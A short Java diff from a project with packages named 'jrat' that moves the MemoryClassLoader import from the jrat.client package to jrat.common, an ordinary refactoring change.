@@ -1,6 +1,6 @@
 package jrat.api;
 
-import jrat.client.MemoryClassLoader;
+import jrat.common.MemoryClassLoader;
 
 import javax.swing.*;
 import java.io.InputStream;
